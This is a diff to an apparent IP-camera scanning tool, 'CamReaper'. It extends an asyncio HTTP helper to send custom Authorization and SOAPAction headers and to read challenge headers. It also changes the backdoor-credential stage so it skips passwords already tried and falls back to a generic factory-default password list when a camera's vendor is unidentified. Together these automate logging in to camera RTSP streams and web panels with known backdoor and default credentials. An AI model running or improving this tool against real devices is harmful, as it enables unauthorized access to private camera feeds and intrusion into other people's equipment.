@@ -147,8 +147,12 @@ def _decode(chunk: bytes) -> str:
 async def _http_request(
     ip: str, port: int, path: str, method: str = "GET",
     content_type: str = "", content: str = "", timeout: float = 5.0,
+    headers: list = None,
 ) -> tuple:
     """Perform one HTTP request and return ``(status, server_header, body)``.
+
+    Thin wrapper over :func:`_http_request_full` for callers that only care about
+    the status line, the ``Server`` header and the body.
 
     Implemented directly on asyncio streams instead of ``urllib`` in a worker
     thread.  urllib is blocking, so every probe used to occupy a thread from the
@@ -164,6 +168,29 @@ async def _http_request(
 
     Returns ``("", "", "")`` on any transport failure.
     """
+    status, server, body, _headers = await _http_request_full(
+        ip, port, path, method, content_type, content, timeout, headers,
+    )
+    return status, server, body
+
+
+async def _http_request_full(
+    ip: str, port: int, path: str, method: str = "GET",
+    content_type: str = "", content: str = "", timeout: float = 5.0,
+    headers: list = None,
+) -> tuple:
+    """Like :func:`_http_request` but also returns the response headers.
+
+    Returns ``(status, server_header, body, headers)`` where ``headers`` is a
+    dict of lower-cased header names.  Callers that have to react to a challenge
+    (the ONVIF module follows a ``WWW-Authenticate`` digest nonce) need more
+    than the ``Server`` header, hence this variant.
+
+    ``headers`` is an optional list of extra ``(name, value)`` pairs, sent
+    verbatim - SOAPAction, WS-Security and Authorization headers all need this.
+
+    Returns ``("", "", "", {})`` on any transport failure.
+    """
     writer = None
     try:
         ssl_ctx = _SSL_CONTEXT if _is_https(port) else None
@@ -177,6 +204,10 @@ async def _http_request(
         head.append(f"Content-Length: {len(body_bytes)}")
         head.append("Connection: close")
         head.append("User-Agent: Mozilla/5.0")
+        # Caller-supplied headers go last so they can override the defaults
+        # (Authorization, SOAPAction, custom User-Agent).
+        if headers:
+            head.extend(f"{n}: {v}" for n, v in headers)
         request = ("\r\n".join(head) + "\r\n\r\n").encode() + body_bytes
         writer.write(request)
         await asyncio.wait_for(writer.drain(), timeout=timeout)
@@ -197,11 +228,15 @@ async def _http_request(
         lines = head_part.decode("utf-8", errors="replace").split("\r\n")
         status = lines[0].split(" ")[1] if len(lines[0].split(" ")) > 1 else ""
         server = ""
+        resp_headers: dict = {}
         content_length = None
         chunked = False
         for line in lines[1:]:
             name, _, value = line.partition(":")
             key = name.strip().lower()
+            if not key:
+                continue
+            resp_headers[key] = value.strip()
             if key == "server" and not server:
                 server = value.strip()
             elif key == "content-length":
@@ -232,11 +267,11 @@ async def _http_request(
                     break
                 body += chunk
 
-        return status, server, _decode(bytes(body[:_MAX_BODY]))
+        return status, server, _decode(bytes(body[:_MAX_BODY])), resp_headers
     except (asyncio.TimeoutError, OSError, ssl.SSLError, ValueError):
-        return "", "", ""
+        return "", "", "", {}
     except Exception:
-        return "", "", ""
+        return "", "", "", {}
     finally:
         if writer is not None:
             try:
@@ -266,16 +301,25 @@ async def _read_chunked(reader, timeout: float, prefix: bytes = b"") -> bytes:
 
 async def find_backdoor_stream(
     client: RTSPClient, entry: CVEEntry, route_parallel: int = 8,
-    routes=None,
+    routes=None, skip: set = None,
 ) -> Optional[tuple]:
     """Try backdoor credentials from a CVE entry via RTSP.
 
     Returns ``(credential, route)`` for the first working combination, or None.
     Every attempt uses a fresh RTSPClient so the caller's socket is untouched.
+
+    ``skip`` holds credentials already tried against this host: the same default
+    password is listed by many CVE entries (``admin:admin`` appeared 15 times in
+    the shipped database), and re-sending it just burns RTSP round-trips - a
+    credential that failed once against a host fails every time.
     """
     ip, port, timeout = client.ip, client.port, client.timeout
     route_list = list(routes) if routes else list(FALLBACK_ROUTES)
+    done = skip if skip is not None else set()
     for cred in entry.credentials:
+        if cred in done:
+            continue
+        done.add(cred)
         probe = RTSPClient(ip, port, timeout, cred)
         try:
             if not await probe.connect():
@@ -340,22 +384,42 @@ async def run_cve_stage(
     Returns a list of Found streams: confirmed RTSP streams (from
     ``backdoor_creds``) plus ``is_http_cve`` markers for web-panel hits.  Only
     the former is a reason to stop scanning the host.
+
+    A vendor that ships no ``backdoor_creds`` entry of its own (or the
+    ``Generic`` catch-all) additionally gets the shared factory-default list, so
+    an unidentified camera is still checked against the passwords these devices
+    ship with instead of being skipped outright.
     """
     from CamReaper.scanner import Found
 
     entries = cve_db.get_for_vendor(vendor)
+    # Fall back to the shared default-password list when the vendor has no
+    # backdoor entry of its own - including the "Generic" vendor, which used to
+    # disable this whole stage.
+    if not any(e.type == "backdoor_creds" for e in entries):
+        if vendor != "Generic":
+            entries = entries + [
+                e for e in cve_db.get_for_vendor("Generic")
+                if e.type == "backdoor_creds"
+            ]
     if not entries:
         return []
 
     found = []
     stream_hit = False
+    # Credentials already tried against this host: the same default password is
+    # listed by many CVE entries, and a credential that failed once against a
+    # host fails every time.
+    tried_creds: set = set()
     for entry in entries:
         if stream_hit:
             break
         if entry.type == "backdoor_creds":
             if stats is not None:
                 stats["cve_tested"] = stats.get("cve_tested", 0) + 1
-            hit = await find_backdoor_stream(live, entry, route_parallel, routes)
+            hit = await find_backdoor_stream(
+                live, entry, route_parallel, routes, skip=tried_creds,
+            )
             if hit:
                 cred, route = hit
                 await record_cve_test(ip, live.port, entry.id, True)
